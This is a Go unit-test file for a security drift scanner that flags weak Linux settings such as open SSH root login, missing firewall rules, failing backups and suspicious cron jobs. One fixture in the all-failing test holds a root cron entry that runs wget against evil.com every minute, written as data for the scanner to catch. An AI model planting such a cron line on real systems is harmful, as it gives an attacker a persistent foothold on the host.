package daemon

import (
	"encoding/json"
	"testing"
)

func newLinuxTestScanner() *driftScanner {
	return &driftScanner{
		svc: &Services{
			Checks: &stubCheckConfig{},
			Config: &Config{},
		},
	}
}

func mustLinuxJSON(state linuxScanState) string {
	b, _ := json.Marshal(state)
	return string(b)
}

func TestParseLinuxFindings_AllPassing(t *testing.T) {
	ds := newLinuxTestScanner()

	state := linuxScanState{}
	state.Firewall.Status = "active"
	state.Firewall.Rules = 15
	state.SSH.RootLogin = "no"
	state.SSH.PasswordAuth = "no"
	state.SSH.Port = "22"
	state.FailedServices.Count = 0
	state.FailedServices.Services = "none"
	state.Disk.Warning = "ok"
	state.Disk.MaxPct = 45
	state.SUID = "none"
	state.Audit = "auditd"
	state.NTPSynced = "yes"
	state.Kernel.IPForward = "0"
	state.Kernel.Syncookies = "1"
	state.Kernel.RPFilter = "1"
	state.Kernel.AcceptRedirects = "0"
	state.OpenPorts = "22,443"
	state.Users = "none"
	state.Permissions = "ok"
	state.AutoUpdate = "nixos_upgrade_timer"
	state.LogForwarding = "rsyslog"
	state.Cron = "none"
	state.CertExpiry = "ok"
	state.Backup.Tool = "restic"
	state.Backup.Status = "current"
	state.Backup.AgeDays = 1
	state.Encryption.Status = "encrypted"
	state.Encryption.UnencryptedMounts = "ok"

	output := mustLinuxJSON(state)
	findings := ds.parseLinuxFindings(output, "linux-host")

	if len(findings) != 0 {
		for _, f := range findings {
			t.Errorf("unexpected finding: %s expected=%s actual=%s", f.CheckType, f.Expected, f.Actual)
		}
	}
}

func TestParseLinuxFindings_AllFailing(t *testing.T) {
	ds := newLinuxTestScanner()

	state := linuxScanState{}
	state.Firewall.Status = "no_rules"
	state.Firewall.Rules = 0
	state.SSH.RootLogin = "yes"
	state.SSH.PasswordAuth = "yes"
	state.FailedServices.Count = 3
	state.FailedServices.Services = "nginx.service,mysql.service,cron.service"
	state.Disk.Warning = "/:96%"
	state.Disk.MaxPct = 96
	state.SUID = "/usr/bin/evil"
	state.Audit = "none"
	state.NTPSynced = "no"
	state.Kernel.IPForward = "1"
	state.Kernel.Syncookies = "0"
	state.Kernel.AcceptRedirects = "1"
	state.OpenPorts = "22,80,443,3306,5432,8080,9090"
	state.Users = "hacker(1001)"
	state.Permissions = "/etc/shadow:777"
	state.AutoUpdate = "none"
	state.LogForwarding = "none"
	state.Cron = "root:* * * * * wget http://evil.com"
	state.CertExpiry = "/etc/ssl/certs/server.crt:Jan 1 2020"
	state.Backup.Tool = "none"
	state.Backup.Status = "missing"
	state.Backup.AgeDays = -1
	state.Encryption.Status = "unencrypted"
	state.Encryption.UnencryptedMounts = "sda2:/"

	output := mustLinuxJSON(state)
	findings := ds.parseLinuxFindings(output, "linux-host")

	foundTypes := make(map[string]bool)
	for _, f := range findings {
		foundTypes[f.CheckType] = true
	}

	expectedChecks := []string{
		"linux_firewall",
		"linux_ssh_config",
		"linux_failed_services",
		"linux_disk_space",
		"linux_suid_binaries",
		"linux_audit_logging",
		"linux_ntp_sync",
		"linux_kernel_params",
		"linux_open_ports",
		"linux_user_accounts",
		"linux_file_permissions",
		"linux_unattended_upgrades",
		"linux_log_forwarding",
		"linux_cron_review",
		"linux_cert_expiry",
		"linux_backup_status",
		"linux_encryption",
	}

	for _, ct := range expectedChecks {
		if !foundTypes[ct] {
			t.Errorf("missing expected check: %s", ct)
		}
	}

	if len(findings) < len(expectedChecks) {
		t.Errorf("expected at least %d findings, got %d", len(expectedChecks), len(findings))
	}
}

func TestParseLinuxFindings_MixedState(t *testing.T) {
	ds := newLinuxTestScanner()

	state := linuxScanState{}
	// Passing
	state.Firewall.Status = "active"
	state.Firewall.Rules = 10
	state.SSH.RootLogin = "no"
	state.SSH.PasswordAuth = "no"
	state.FailedServices.Count = 0
	state.FailedServices.Services = "none"
	state.Disk.Warning = "ok"
	state.Disk.MaxPct = 40
	state.SUID = "none"
	state.NTPSynced = "yes"
	state.Kernel.IPForward = "0"
	state.Kernel.Syncookies = "1"
	state.Kernel.AcceptRedirects = "0"
	state.OpenPorts = "22"
	state.Users = "none"
	state.Permissions = "ok"
	state.AutoUpdate = "nixos_upgrade_timer"
	state.CertExpiry = "ok"
	state.Encryption.Status = "encrypted"
	// Failing
	state.Audit = "journald_volatile"
	state.LogForwarding = "none"
	state.Cron = "bob:0 3 * * * /usr/bin/backup.sh"
	state.Backup.Tool = "restic"
	state.Backup.Status = "stale"
	state.Backup.AgeDays = 12

	output := mustLinuxJSON(state)
	findings := ds.parseLinuxFindings(output, "linux-host")

	foundTypes := make(map[string]bool)
	for _, f := range findings {
		foundTypes[f.CheckType] = true
	}

	expectedPresent := []string{
		"linux_audit_logging",
		"linux_log_forwarding",
		"linux_cron_review",
		"linux_backup_status",
	}
	expectedAbsent := []string{
		"linux_firewall",
		"linux_ssh_config",
		"linux_disk_space",
		"linux_suid_binaries",
	}

	for _, ct := range expectedPresent {
		if !foundTypes[ct] {
			t.Errorf("expected finding for %s", ct)
		}
	}
	for _, ct := range expectedAbsent {
		if foundTypes[ct] {
			t.Errorf("unexpected finding for %s", ct)
		}
	}
}

func TestParseLinuxFindings_EmptyJSON(t *testing.T) {
	ds := newLinuxTestScanner()

	findings := ds.parseLinuxFindings("{}", "linux-host")

	// Empty JSON: most zero values should not trigger.
	// But firewall.rules=0, audit="", etc. may trigger.
	// Key point: should not panic.
	foundTypes := make(map[string]bool)
	for _, f := range findings {
		foundTypes[f.CheckType] = true
	}

	// Firewall rules=0 should trigger
	if !foundTypes["linux_firewall"] {
		t.Error("empty state should flag linux_firewall (rules=0)")
	}
}

func TestParseLinuxFindings_NilInput(t *testing.T) {
	ds := newLinuxTestScanner()

	findings := ds.parseLinuxFindings("", "linux-host")
	if findings != nil {
		t.Error("empty input should return nil")
	}
}

func TestParseLinuxFindings_InvalidJSON(t *testing.T) {
	ds := newLinuxTestScanner()

	findings := ds.parseLinuxFindings("not json at all", "linux-host")
	if findings != nil {
		t.Error("invalid JSON should return nil")
	}
}

func TestParseLinuxFindings_NoJSON(t *testing.T) {
	ds := newLinuxTestScanner()

	findings := ds.parseLinuxFindings("some shell output without braces", "linux-host")
	if findings != nil {
		t.Error("output without JSON should return nil")
	}
}

func TestParseLinuxFindings_JSONWithPrefix(t *testing.T) {
	ds := newLinuxTestScanner()

	// Real-world: scan script may print warnings before JSON
	state := linuxScanState{}
	state.Firewall.Status = "active"
	state.Firewall.Rules = 10
	state.SSH.RootLogin = "no"
	state.SSH.PasswordAuth = "no"
	state.FailedServices.Count = 0
	state.FailedServices.Services = "none"
	state.Disk.Warning = "ok"
	state.SUID = "none"
	state.Audit = "auditd"
	state.NTPSynced = "yes"
	state.Kernel.IPForward = "0"
	state.Kernel.Syncookies = "1"
	state.Kernel.AcceptRedirects = "0"
	state.OpenPorts = "none"
	state.Users = "none"
	state.Permissions = "ok"
	state.AutoUpdate = "nixos_upgrade_timer"
	state.LogForwarding = "rsyslog"
	state.Cron = "none"
	state.CertExpiry = "ok"
	state.Backup.Tool = "restic"
	state.Backup.Status = "current"
	state.Encryption.Status = "encrypted"
	state.Encryption.UnencryptedMounts = "ok"

	jsonBytes, _ := json.Marshal(state)
	prefixed := "WARNING: some command not found\nDEBUG: something else\n" + string(jsonBytes)

	findings := ds.parseLinuxFindings(prefixed, "linux-host")
	if len(findings) != 0 {
		for _, f := range findings {
			t.Errorf("unexpected finding after prefix stripping: %s", f.CheckType)
		}
	}
}

func TestParseLinuxFindings_DiskSeverity(t *testing.T) {
	tests := []struct {
		name     string
		maxPct   int
		warning  string
		wantSev  string
		wantFind bool
	}{
		{"90% - no drift", 90, "ok", "", false},
		{"91% - medium", 91, "/:91%", "medium", true},
		{"95% - medium", 95, "/:95%", "medium", true},
		{"96% - high", 96, "/:96%", "high", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ds := newLinuxTestScanner()
			state := linuxScanState{}
			state.Firewall.Status = "active"
			state.Firewall.Rules = 10
			state.SSH.RootLogin = "no"
			state.SSH.PasswordAuth = "no"
			state.SUID = "none"
			state.Audit = "auditd"
			state.NTPSynced = "yes"
			state.Kernel.Syncookies = "1"
			state.OpenPorts = "none"
			state.Users = "none"
			state.Permissions = "ok"
			state.AutoUpdate = "nixos_upgrade_timer"
			state.LogForwarding = "rsyslog"
			state.Cron = "none"
			state.CertExpiry = "ok"
			state.Backup.Tool = "restic"
			state.Backup.Status = "current"
			state.Encryption.Status = "encrypted"
			state.Encryption.UnencryptedMounts = "ok"
			state.Disk.Warning = tt.warning
			state.Disk.MaxPct = tt.maxPct

			output := mustLinuxJSON(state)
			findings := ds.parseLinuxFindings(output, "linux-host")
			found := false
			for _, f := range findings {
				if f.CheckType == "linux_disk_space" {
					found = true
					if f.Severity != tt.wantSev {
						t.Errorf("disk at %d%%: want severity=%s, got=%s", tt.maxPct, tt.wantSev, f.Severity)
					}
				}
			}
			if found != tt.wantFind {
				t.Errorf("disk at %d%%: wantFind=%v, got=%v", tt.maxPct, tt.wantFind, found)
			}
		})
	}
}

func TestParseLinuxFindings_KernelParams(t *testing.T) {
	tests := []struct {
		name      string
		ipFwd     string
		cookies   string
		redirects string
		wantDrift bool
	}{
		{"all hardened", "0", "1", "0", false},
		{"ip forward on", "1", "1", "0", true},
		{"syncookies off", "0", "0", "0", true},
		{"redirects on", "0", "1", "1", true},
		{"all bad", "1", "0", "1", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ds := newLinuxTestScanner()
			state := linuxScanState{}
			state.Firewall.Status = "active"
			state.Firewall.Rules = 10
			state.SUID = "none"
			state.Audit = "auditd"
			state.NTPSynced = "yes"
			state.Users = "none"
			state.Permissions = "ok"
			state.OpenPorts = "none"
			state.AutoUpdate = "unattended_upgrades"
			state.LogForwarding = "rsyslog"
			state.Cron = "none"
			state.CertExpiry = "ok"
			state.Backup.Tool = "restic"
			state.Backup.Status = "current"
			state.Encryption.Status = "encrypted"
			state.Encryption.UnencryptedMounts = "ok"
			state.SSH.RootLogin = "no"
			state.SSH.PasswordAuth = "no"
			state.Kernel.IPForward = tt.ipFwd
			state.Kernel.Syncookies = tt.cookies
			state.Kernel.AcceptRedirects = tt.redirects

			output := mustLinuxJSON(state)
			findings := ds.parseLinuxFindings(output, "host")
			found := false
			for _, f := range findings {
				if f.CheckType == "linux_kernel_params" {
					found = true
				}
			}
			if found != tt.wantDrift {
				t.Errorf("kernel(%s,%s,%s): wantDrift=%v got=%v",
					tt.ipFwd, tt.cookies, tt.redirects, tt.wantDrift, found)
			}
		})
	}
}

func TestParseLinuxFindings_DisabledChecks(t *testing.T) {
	ds := &driftScanner{
		svc: &Services{
			Checks: &stubCheckConfig{
				disabled: map[string]bool{
					"linux_firewall": true,
					"linux_encryption": true,
				},
			},
			Config: &Config{},
		},
	}

	state := linuxScanState{}
	state.Firewall.Status = "no_rules"
	state.Firewall.Rules = 0
	state.Encryption.Status = "unencrypted"
	state.Encryption.UnencryptedMounts = "sda2:/"
	// Fill rest to pass
	state.SSH.RootLogin = "no"
	state.SSH.PasswordAuth = "no"
	state.SUID = "none"
	state.Audit = "auditd"
	state.NTPSynced = "yes"
	state.Kernel.Syncookies = "1"
	state.OpenPorts = "none"
	state.Users = "none"
	state.Permissions = "ok"
	state.AutoUpdate = "unattended_upgrades"
	state.LogForwarding = "rsyslog"
	state.Cron = "none"
	state.CertExpiry = "ok"
	state.Backup.Tool = "restic"
	state.Backup.Status = "current"

	output := mustLinuxJSON(state)
	findings := ds.parseLinuxFindings(output, "host")

	for _, f := range findings {
		if f.CheckType == "linux_firewall" || f.CheckType == "linux_encryption" {
			t.Errorf("disabled check %s should have been filtered", f.CheckType)
		}
	}
}

func TestParseLinuxFindings_SSHIssues(t *testing.T) {
	tests := []struct {
		name      string
		root      string
		passAuth  string
		wantDrift bool
	}{
		{"both hardened", "no", "no", false},
		{"root login yes", "yes", "no", true},
		{"password auth yes", "no", "yes", true},
		{"both bad", "yes", "yes", true},
		{"prohibit-password (default)", "prohibit-password", "no", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ds := newLinuxTestScanner()
			state := linuxScanState{}
			state.Firewall.Status = "active"
			state.Firewall.Rules = 10
			state.SSH.RootLogin = tt.root
			state.SSH.PasswordAuth = tt.passAuth
			state.SUID = "none"
			state.Audit = "auditd"
			state.NTPSynced = "yes"
			state.Kernel.Syncookies = "1"
			state.OpenPorts = "none"
			state.Users = "none"
			state.Permissions = "ok"
			state.AutoUpdate = "unattended_upgrades"
			state.LogForwarding = "rsyslog"
			state.Cron = "none"
			state.CertExpiry = "ok"
			state.Backup.Tool = "restic"
			state.Backup.Status = "current"
			state.Encryption.Status = "encrypted"
			state.Encryption.UnencryptedMounts = "ok"

			output := mustLinuxJSON(state)
			findings := ds.parseLinuxFindings(output, "host")
			found := false
			for _, f := range findings {
				if f.CheckType == "linux_ssh_config" {
					found = true
				}
			}
			if found != tt.wantDrift {
				t.Errorf("SSH(root=%s,pass=%s): wantDrift=%v got=%v",
					tt.root, tt.passAuth, tt.wantDrift, found)
			}
		})
	}
}

func TestParseLinuxFindings_OpenPortsThreshold(t *testing.T) {
	tests := []struct {
		name      string
		ports     string
		wantDrift bool
	}{
		{"none", "none", false},
		{"few ports", "22,80,443", false},
		{"exactly 5", "22,80,443,3306,5432", false},
		{"6 ports = drift", "22,80,443,3306,5432,8080", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ds := newLinuxTestScanner()
			state := linuxScanState{}
			state.Firewall.Status = "active"
			state.Firewall.Rules = 10
			state.SSH.RootLogin = "no"
			state.SSH.PasswordAuth = "no"
			state.SUID = "none"
			state.Audit = "auditd"
			state.NTPSynced = "yes"
			state.Kernel.Syncookies = "1"
			state.Users = "none"
			state.Permissions = "ok"
			state.AutoUpdate = "unattended_upgrades"
			state.LogForwarding = "rsyslog"
			state.Cron = "none"
			state.CertExpiry = "ok"
			state.Backup.Tool = "restic"
			state.Backup.Status = "current"
			state.Encryption.Status = "encrypted"
			state.Encryption.UnencryptedMounts = "ok"
			state.OpenPorts = tt.ports

			output := mustLinuxJSON(state)
			findings := ds.parseLinuxFindings(output, "host")
			found := false
			for _, f := range findings {
				if f.CheckType == "linux_open_ports" {
					found = true
				}
			}
			if found != tt.wantDrift {
				t.Errorf("OpenPorts=%s: wantDrift=%v got=%v", tt.ports, tt.wantDrift, found)
			}
		})
	}
}
